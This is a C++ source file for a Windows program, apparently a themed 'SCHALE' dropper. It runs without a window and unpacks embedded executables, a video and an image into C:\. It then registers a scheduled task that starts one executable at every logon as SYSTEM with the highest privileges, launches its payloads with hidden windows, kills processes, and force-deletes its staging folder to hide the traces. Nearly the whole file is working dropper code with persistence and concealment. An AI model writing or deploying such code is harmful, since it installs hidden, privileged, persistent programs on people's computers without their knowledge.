#include <Windows.h>
#include <string>
// #include <thread>
#include "resource.h"

#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

/*
void S1()
{
	system("del /f /s /q C:\\SCHALEGUI.exe");
}

void S2()
{
	system("del /f /s /q C:\\SCHALEWALLPAPER.exe");
}

void S3()
{
	system("del /f /s /q C:\\SCHALECLEANUP.exe");
}

void S4()
{
	system("del /f /s /q C:\\SCHALE.mp4");
}

void S5()
{
	system("del /f /s /q C:\\BA.png");
}

void S6()
{
	system("del /f /s /q C:\\ffplay.exe");
}
*/

BOOL RF(DWORD dwResName, LPCSTR lpResType, LPCSTR lpFilePathName)
{
	HMODULE hInstance = GetModuleHandle(NULL);
	HRSRC hResID = FindResource(hInstance, MAKEINTRESOURCE(dwResName), lpResType);
	HGLOBAL hRes = LoadResource(hInstance, hResID);
	LPVOID pRes = LockResource(hRes);

	if (pRes == NULL)
	{
		return FALSE;
	}

	DWORD dwResSize = SizeofResource(hInstance, hResID);
	HANDLE hResFile = CreateFile(lpFilePathName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (INVALID_HANDLE_VALUE == hResFile)
	{
		return FALSE;
	}

	DWORD dwWritten = 0;
	WriteFile(hResFile, pRes, dwResSize, &dwWritten, NULL);
	CloseHandle(hResFile);
	return (dwResSize == dwWritten);
}

void STARTSCHALE()
{
	std::string SCHALE = "C:\\SCHALE";
	CreateDirectory(SCHALE.c_str(), NULL);

	RF(IDB_PNG1, "PNG", "C:\\SCHALE\\BA.png");
	RF(IDR_MP41, "MP4", "C:\\SCHALE\\SCHALE.mp4");
	RF(IDR_EXE1, "EXE", "C:\\SCHALE\\ffplay.exe");
	RF(IDR_EXE2, "EXE", "C:\\S.C.H.A.L.E.exe");
	RF(IDR_EXE3, "EXE", "C:\\SCHALE\\SCHALECLEANUP.exe");
	RF(IDR_EXE4, "EXE", "C:\\SCHALE\\SCHALEGUI.exe");
	RF(IDR_EXE5, "EXE", "C:\\SCHALE\\SCHALEWALLPAPER.exe");

	system("schtasks /create /tn \"SCHALE\" /tr C:\\S.C.H.A.L.E.exe /sc onlogon /ru \"System\" /rl HIGHEST /f");
	system("schtasks /run \"SCHALE\"");

	ShellExecute(NULL, "open", "C:\\S.C.H.A.L.E.exe", NULL, NULL, SW_HIDE);
	ShellExecute(NULL, "open", "C:\\SCHALE\\SCHALEGUI.exe", NULL, NULL, SW_HIDE);
	Sleep(3000);

	ShellExecute(NULL, "open", "C:\\SCHALE\\SCHALEWALLPAPER.exe", NULL, NULL, SW_HIDE);
	system("taskkill /f /im SCHALEGUI.exe");
	Sleep(5000);

	ShellExecute(NULL, "open", "C:\\SCHALE\\SCHALECLEANUP.exe", NULL, NULL, SW_HIDE);
	Sleep(10000);

	system("taskkill /f /im ffplay.exe");
	system("taskkill /f /im SCHALEWALLPAPER.exe");

	/*
	std::thread s1(S1);
	std::thread s2(S2);
	std::thread s3(S3);
	std::thread s4(S4);
	std::thread s5(S5);
	std::thread s6(S6);
	s1.detach();
	s2.detach();
	s3.detach();
	s4.detach();
	s5.detach();
	s6.detach();
	*/

	system("del /f /s /q C:\\SCHALE");
	system("rd C:\\SCHALE");
}

int main()
{
	STARTSCHALE();
}